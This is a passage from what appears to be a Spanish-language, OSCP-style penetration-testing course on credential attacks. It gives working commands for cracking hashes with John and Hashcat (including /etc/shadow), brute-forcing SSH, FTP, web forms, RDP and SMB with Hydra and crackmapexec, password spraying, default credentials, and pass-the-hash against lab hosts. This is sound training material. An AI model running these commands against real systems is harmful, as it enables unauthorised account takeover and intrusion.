Las credenciales débiles son la vía de entrada más común. Aprende a crackear hashes offline y a hacer fuerza bruta online con cuidado.

3. Crackear offline: John y Hashcat

# John the Ripper
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
$ john --show hashes.txt
# Para /etc/shadow: primero combinar passwd+shadow
$ unshadow /etc/passwd /etc/shadow > combinado.txt
$ john combinado.txt

# Hashcat (usa la GPU, mucho más rápido). -m = tipo de hash
$ hashcat -m 0 hash.txt rockyou.txt       # 0 = MD5
$ hashcat -m 1000 hash.txt rockyou.txt    # 1000 = NTLM
$ hashcat -m 1800 hash.txt rockyou.txt    # 1800 = sha512crypt ($6$)
$ hashcat -m 22000 hash.txt rockyou.txt   # 22000 = WPA

4. Fuerza bruta online: Hydra

⚠️ Online = ruidoso y lentoPruebas contraseñas contra un servicio en vivo. Puede bloquear cuentas y queda en los logs. Úsalo con listas pequeñas y usuarios concretos.
# SSH
$ hydra -l juan -P rockyou.txt ssh://10.0.2.4
# FTP con lista de usuarios y contraseñas
$ hydra -L users.txt -P pass.txt ftp://10.0.2.4
# Formulario web POST (http-post-form)
$ hydra -l admin -P rockyou.txt 10.0.2.4 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid"
# RDP / SMB
$ hydra -l admin -P pass.txt rdp://10.0.2.5
$ crackmapexec smb 10.0.2.5 -u users.txt -p pass.txt
📘 Password sprayingAl revés que la fuerza bruta: pruebas UNA contraseña común (ej. Primavera2024!) contra MUCHOS usuarios. Evita bloqueos y es muy efectivo en empresas.

5. Credenciales por defecto

Antes de romper nada, prueba lo obvio: admin:admin, root:toor, admin:password, tomcat:tomcat, sa:(vacío). Busca “[producto] default credentials”.

🔴 Nivel OSCP / AD: Pass-the-HashEn Windows no siempre necesitas la contraseña: con el hash NTLM puedes autenticarte directamente (pass-the-hash): 
crackmapexec smb 10.0.2.5 -u Administrator -H <hash_NTLM>
evil-winrm -i 10.0.2.5 -u Administrator -H <hash_NTLM>
psexec.py Administrator@10.0.2.5 -hashes :<hash_NTLM>
Lo verás a fondo en Active Directory (módulo 14).
